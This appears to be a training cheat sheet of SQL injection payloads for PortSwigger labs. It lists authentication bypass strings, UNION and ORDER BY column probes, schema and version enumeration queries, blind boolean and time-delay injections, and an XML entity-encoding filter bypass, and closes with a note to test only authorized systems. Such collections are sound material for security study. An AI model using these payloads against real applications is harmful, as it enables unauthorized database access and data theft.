# SQL Injection Payload Collection

This document contains payloads commonly used during SQL Injection testing and PortSwigger labs.

---

# Authentication Bypass

```sql
' OR '1'='1
```

```sql
admin'--
```

```sql
' OR 1=1--
```

---

# Finding Number of Columns

## ORDER BY Method

```sql
' ORDER BY 1--
```

```sql
' ORDER BY 2--
```

```sql
' ORDER BY 3--
```

```sql
' ORDER BY 4--
```

---

## UNION NULL Method

```sql
' UNION SELECT NULL--
```

```sql
' UNION SELECT NULL,NULL--
```

```sql
' UNION SELECT NULL,NULL,NULL--
```

```sql
' UNION SELECT NULL,NULL,NULL,NULL--
```

---

# Finding Visible Columns

```sql
' UNION SELECT 'A','B'--
```

```sql
' UNION SELECT 'A','B','C'--
```

---

# Database Version Enumeration

## MySQL

```sql
SELECT @@version;
```

## PostgreSQL

```sql
SELECT version();
```

## Oracle

```sql
SELECT * FROM v$version;
```

---

# Database Enumeration

## Find Tables

```sql
SELECT * FROM information_schema.tables;
```

## Find Columns

```sql
SELECT * FROM information_schema.columns;
```

## Find Current Database

```sql
SELECT database();
```

---

# Boolean-Based Blind SQLi

```sql
' AND 1=1--
```

```sql
' AND 1=2--
```

---

# Time-Based Blind SQLi

## MySQL

```sql
' AND SLEEP(5)--
```

## SQL Server

```sql
' WAITFOR DELAY '0:0:5'--
```

---

# XML-Based SQL Injection

```xml
&#x53;ELECT
```

Example:

```xml
<stockCheck>
    <productId>1</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

---

# Notes

Always perform testing only on authorized applications, labs, or environments designed for security research.
